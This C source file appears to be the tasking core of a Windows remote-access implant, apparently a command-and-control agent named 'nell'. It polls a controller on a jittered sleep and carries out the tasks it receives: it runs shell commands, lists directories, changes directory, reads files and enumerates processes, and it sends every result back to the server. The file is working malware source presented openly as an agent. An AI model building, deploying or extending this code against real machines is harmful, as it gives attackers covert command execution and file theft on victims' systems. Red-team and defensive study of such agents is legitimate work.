#include <windows.h>
#include <stdio.h>
#include "Command.h"
#include "Utils.h"
#include "nell.h"

BOOL routine()
{
    LOG("[*] routine: Asking for new tasks...");
    PPackage getTask = PackageCreate();
    if (!getTask) return FALSE;

    PackageAddByte(getTask, GET_TASKING);
    PackageAddInt32(getTask, NUMBER_OF_TASKS);

    PParser ResponseParser = sendPackage(getTask);
    PackageDestroy(getTask);

    if (ResponseParser)
    {
        LOG("[+] routine: Received response.");
        commandDispatch(ResponseParser);
        ParserDestroy(ResponseParser);
    }
    else
    {
        LOG("[-] routine: No response or failure.");
    }

    DWORD sleepMs = nellConfig->sleeptime * 1000;
    
    if (nellConfig->jitter > 0)
    {
        DWORD variation = (sleepMs * nellConfig->jitter) / 100;
        if (variation > 0)
        {
            int offset = (rand() % (variation * 2 + 1)) - variation;
            if (offset < 0 && (DWORD)(-offset) > sleepMs) {
                sleepMs = 0;
            } else {
                sleepMs += offset;
            }
        }
    }

    LOG("[*] routine: Sleeping %d ms...", sleepMs);
    Sleep(sleepMs); 

    return TRUE;
}

BOOL commandDispatch(PParser response)
{
    if (!response) return FALSE;

    BYTE typeResponse = ParserGetByte(response);
    LOG("[*] commandDispatch: Response type: 0x%02X", typeResponse);
    
    if (typeResponse == GET_TASKING)
        return handleGetTasking(response);

    return TRUE;
}

BOOL handleGetTasking(PParser getTasking)
{
    UINT32 numTasks = ParserGetInt32(getTasking);
    LOG("[*] handleGetTasking: numTasks = %d", numTasks);
    
    for (UINT32 i = 0; i < numTasks; i++)
    {
        SIZE_T totalSize = (SIZE_T)ParserGetInt32(getTasking);
        LOG("[*] Task %d size: %llu", i, totalSize);
        
        if (totalSize < 1) continue;
        
        SIZE_T payloadSize = totalSize - 1;

        BYTE taskID = ParserGetByte(getTasking);
        LOG("[*] Task ID: 0x%02X", taskID);
        
        PBYTE taskBuffer = ParserGetBytesRaw(getTasking, payloadSize);
        PParser taskParser = ParserCreate(taskBuffer, payloadSize);
        if (taskBuffer) LocalFree(taskBuffer);

        if (taskID == SHELL_CMD && taskParser) 
        {
            LOG("[*] Executing SHELL_CMD");
            executeShell(taskParser);
        }
        else if (taskID == DIR_LIST && taskParser)
        {
             LOG("[*] Executing DIR_LIST");
             executeDir(taskParser);
        }
        else if (taskID == EXIT_CMD && taskParser)
        {
             LOG("[*] Executing EXIT_CMD");
             executeExit(taskParser);
        }
        else if (taskID == CD_CMD && taskParser)
        {
            LOG("[*] Executing CD_CMD");
            executeCd(taskParser);
        }
        else if (taskID == CAT_CMD && taskParser)
        {
            LOG("[*] Executing CAT_CMD");
            executeCat(taskParser);
        }
        else if (taskID == PS_CMD && taskParser)
        {
            LOG("[*] Executing PS_CMD");
            executePs(taskParser);
        }
        else
        {
            LOG("[-] Unknown task or invalid parser");
        }
        
        if (taskParser) ParserDestroy(taskParser);
    }
    return TRUE;
}

BOOL executeShell(PParser arguments)
{
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) 
    {
        LOG("[-] executeShell: Failed to get UUID");
        return FALSE;
    }

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    if (!taskUuid) { LocalFree(uuidBytes); return FALSE; }
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    LOG("[*] Task UUID: %s", taskUuid);

    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;

    SIZE_T cmdLen = 0;
    PBYTE cmdBytes = ParserGetBytes(arguments, &cmdLen);
    
    if (!cmdBytes)
    {
        LOG("[-] executeShell: Failed to get CMD");
        LocalFree(taskUuid);
        return FALSE;
    }

    SIZE_T extendedSize = cmdLen + 6;
    PCHAR cmd = (PCHAR)LocalAlloc(LPTR, extendedSize);
    if (!cmd) { LocalFree(taskUuid); LocalFree(cmdBytes); return FALSE; }
    
    memcpy(cmd, cmdBytes, cmdLen);
    cmd[cmdLen] = '\0';
    strcat(cmd, " 2>&1");
    LocalFree(cmdBytes);

    LOG("[*] Command to run: %s", cmd);

    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    LOG("[*] invoking _popen...");
    FILE* fp = _popen(cmd, "rb");
    if (fp)
    {
        CHAR path[1035];
        while (fgets(path, sizeof(path), fp) != NULL)
        {
            PackageAddBytesRaw(output, (PBYTE)path, strlen(path));
        }
        _pclose(fp);
    }
    else
    {
        LOG("[-] _popen failed");
        CHAR* err = "Failed to run command";
        PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }
    
    LOG("[*] Output size: %d", output->length);
    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);

    LOG("[*] Sending POST_RESPONSE...");
    PParser ResponseParser = sendPackage(responseTask);
    
    if (ResponseParser)
    {
        LOG("[+] POST_RESPONSE succcess");
        ParserDestroy(ResponseParser);
    }
    else
    {
        LOG("[-] POST_RESPONSE failed");
    }
    
    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);
    LocalFree(cmd);

    return TRUE;
}

BOOL executeDir(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) 
    {
        LOG("[-] executeDir: Failed to get UUID");
        return FALSE;
    }

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    if (!taskUuid) { LocalFree(uuidBytes); return FALSE; }
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    LOG("[*] Task UUID: %s", taskUuid);

    // 2. Num Args
    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;
    
    // 3. Get Path
    SIZE_T cmdLen = 0;
    PBYTE cmdBytes = ParserGetBytes(arguments, &cmdLen);
    
    // Prepare Response Packages
    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    if (!cmdBytes)
    {
        LOG("[-] executeDir: Failed to get Path");
        // We still send response, but with error
        char* err = "Missing path argument";
        PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }
    else
    {
        PCHAR path = (PCHAR)LocalAlloc(LPTR, cmdLen + 3); // +3 for \*, \0
        if (path)
        {
            memcpy(path, cmdBytes, cmdLen);
            path[cmdLen] = '\0';
            
            // Logic to handle "dir ." command from shell which often means "current directory"
            if (strcmp(path, ".") == 0)
            {
                GetCurrentDirectoryA(cmdLen + 3, path); // Overwrite with full path if possible, or just use *
                // actually GetCurrentDirectory needs size. simple:
                strcpy(path, "*");
            }
            else
            {
                // Simple logic: if it doesn't end in *, append \*
                // Assumes input is a directory path
                char last = path[strlen(path)-1];
                if (last != '*')
                {
                    if (last != '\\' && last != '/')
                        strcat(path, "\\*");
                    else
                        strcat(path, "*");
                }
            }
            
            LOG("[*] Listing directory: %s", path);
            
            WIN32_FIND_DATA findData;
            HANDLE hFind = FindFirstFile(path, &findData);
            
            if (hFind == INVALID_HANDLE_VALUE)
            {
                char* err = "Failed to list directory";
                PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
            }
            else
            {
                do
                {
                    // Output format: Name\n
                    PackageAddBytesRaw(output, (PBYTE)findData.cFileName, strlen(findData.cFileName));
                    PackageAddBytesRaw(output, (PBYTE)"\n", 1);
                } while (FindNextFile(hFind, &findData));
                FindClose(hFind);
            }
            LocalFree(path);
        }
        LocalFree(cmdBytes);
    }
    
    LOG("[*] Output size: %d", output->length);
    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);

    LOG("[*] Sending POST_RESPONSE...");
    PParser ResponseParser = sendPackage(responseTask);
    
    if (ResponseParser)
    {
        LOG("[+] POST_RESPONSE succcess");
        ParserDestroy(ResponseParser);
    }
    
    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);


    return TRUE;
}

BOOL executeExit(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (uuidBytes)
    {
        PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
        if (taskUuid)
        {
            memcpy(taskUuid, uuidBytes, uuidLen);
            taskUuid[uuidLen] = '\0';
            
            LOG("[*] Task UUID: %s", taskUuid);

            // Send response saying we are dying
            PPackage responseTask = PackageCreate();
            PackageAddByte(responseTask, POST_RESPONSE);
            PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
            
            char* msg = "Agent exiting...";
            PackageAddBytes(responseTask, (PBYTE)msg, strlen(msg));

            LOG("[*] Sending Exit response...");
            PParser ResponseParser = sendPackage(responseTask);
            if (ResponseParser) ParserDestroy(ResponseParser);
            
            PackageDestroy(responseTask);
            LocalFree(taskUuid);
        }
        LocalFree(uuidBytes);
    }

    LOG("[*] Calling ExitProcess(0)");
    ExitProcess(0);
    return TRUE;
}

BOOL executeCd(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) 
    {
        LOG("[-] executeCd: Failed to get UUID");
        return FALSE;
    }

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    if (!taskUuid) { LocalFree(uuidBytes); return FALSE; }
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    // 2. Num Args
    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;

    // 3. Path
    SIZE_T cmdLen = 0;
    PBYTE cmdBytes = ParserGetBytes(arguments, &cmdLen);

    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    if (cmdBytes)
    {
        PCHAR path = (PCHAR)LocalAlloc(LPTR, cmdLen + 1);
        if (path)
        {
            memcpy(path, cmdBytes, cmdLen);
            path[cmdLen] = '\0';

            LOG("[*] Changing directory to: %s", path);
            
            if (SetCurrentDirectory(path))
            {
                // Send success + new path
                CHAR currentDir[MAX_PATH];
                if (GetCurrentDirectory(MAX_PATH, currentDir))
                {
                    char* msg = "Changed directory to: ";
                    PackageAddBytesRaw(output, (PBYTE)msg, strlen(msg));
                    PackageAddBytesRaw(output, (PBYTE)currentDir, strlen(currentDir));
                }
                else
                {
                    char* msg = "Changed directory (failed to get new CWD)";
                    PackageAddBytesRaw(output, (PBYTE)msg, strlen(msg));
                }
            }
            else
            {
                 // Failed
                char* err = "Failed to change directory";
                PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
            }
            LocalFree(path);
        }
        LocalFree(cmdBytes);
    }
    else
    {
         char* err = "Missing path argument";
         PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }

    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);
    
    LOG("[*] Sending CD response...");
    PParser ResponseParser = sendPackage(responseTask);
    if (ResponseParser) ParserDestroy(ResponseParser);

    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);

    return TRUE;
}

BOOL executeCat(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) return FALSE;

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    // 2. Num Args
    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;

    // 3. Path
    SIZE_T cmdLen = 0;
    PBYTE cmdBytes = ParserGetBytes(arguments, &cmdLen);

    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    if (cmdBytes)
    {
        PCHAR path = (PCHAR)LocalAlloc(LPTR, cmdLen + 1);
        if (path)
        {
            memcpy(path, cmdBytes, cmdLen);
            path[cmdLen] = '\0';
            
            LOG("[*] Reading file: %s", path);
            
            HANDLE hFile = CreateFileA(
                path, 
                GENERIC_READ, 
                FILE_SHARE_READ, 
                NULL, 
                OPEN_EXISTING, 
                FILE_ATTRIBUTE_NORMAL, 
                NULL
            );
            
            if (hFile != INVALID_HANDLE_VALUE)
            {
                DWORD fileSize = GetFileSize(hFile, NULL);
                if (fileSize > 0 && fileSize < 1024 * 1024 * 5) // Limit to 5MB
                {
                    PBYTE fileBuf = (PBYTE)LocalAlloc(LPTR, fileSize + 1);
                    if (fileBuf)
                    {
                        DWORD bytesRead = 0;
                        if (ReadFile(hFile, fileBuf, fileSize, &bytesRead, NULL))
                        {
                            // Check for BOMs
                            // UTF-16 LE: FF FE
                            if (bytesRead >= 2 && fileBuf[0] == 0xFF && fileBuf[1] == 0xFE)
                            {
                                // Convert UTF-16 LE to UTF-8
                                WCHAR* wideBuf = (WCHAR*)(fileBuf + 2); // Skip BOM
                                int wideLen = (bytesRead - 2) / 2;
                                
                                int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideBuf, wideLen, NULL, 0, NULL, NULL);
                                if (utf8Len > 0)
                                {
                                    PBYTE utf8Buf = (PBYTE)LocalAlloc(LPTR, utf8Len + 1);
                                    if (utf8Buf)
                                    {
                                        WideCharToMultiByte(CP_UTF8, 0, wideBuf, wideLen, (char*)utf8Buf, utf8Len, NULL, NULL);
                                        PackageAddBytesRaw(output, utf8Buf, utf8Len);
                                        LocalFree(utf8Buf);
                                    }
                                }
                            }
                            // UTF-8 BOM: EF BB BF
                            else if (bytesRead >= 3 && fileBuf[0] == 0xEF && fileBuf[1] == 0xBB && fileBuf[2] == 0xBF)
                            {
                                // Skip BOM
                                PackageAddBytesRaw(output, fileBuf + 3, bytesRead - 3);
                            }
                            else
                            {
                                // Normal read
                                PackageAddBytesRaw(output, fileBuf, bytesRead);
                            }
                        }
                        else
                        {
                            char* err = "Failed to read file.";
                            PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
                        }
                        LocalFree(fileBuf);
                    }
                }
                else if (fileSize == 0)
                {
                    char* msg = "[Empty file]";
                    PackageAddBytesRaw(output, (PBYTE)msg, strlen(msg));
                }
                else
                {
                    char* err = "File too large (>5MB).";
                    PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
                }
                CloseHandle(hFile);
            }
            else
            {
                char* err = "Failed to open file.";
                PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
            }
            LocalFree(path);
        }
        LocalFree(cmdBytes);
    }
    else
    {
         char* err = "Missing path.";
         PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }

    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);
    PParser ResponseParser = sendPackage(responseTask);
    if (ResponseParser) ParserDestroy(ResponseParser);
    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);

    return TRUE;
}

#include <tlhelp32.h>

BOOL executePs(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) return FALSE;

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    // 2. Num Args
    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;

    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    LOG("[*] Enumerating processes...");
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32))
        {
             // Header
             char* header = "PID\tName\n===\t====\n";
             PackageAddBytesRaw(output, (PBYTE)header, strlen(header));
             
             do
             {
                 char line[MAX_PATH + 20];
                 snprintf(line, sizeof(line), "%d\t%s\n", pe32.th32ProcessID, pe32.szExeFile);
                 PackageAddBytesRaw(output, (PBYTE)line, strlen(line));
             } while (Process32Next(hSnapshot, &pe32));
        }
        else
        {
            char* err = "Failed to get first process.";
            PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
        }
        CloseHandle(hSnapshot);
    }
    else
    {
         char* err = "Failed to create snapshot.";
         PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }

    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);
    PParser ResponseParser = sendPackage(responseTask);
    if (ResponseParser) ParserDestroy(ResponseParser);
    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);

    return TRUE;
}
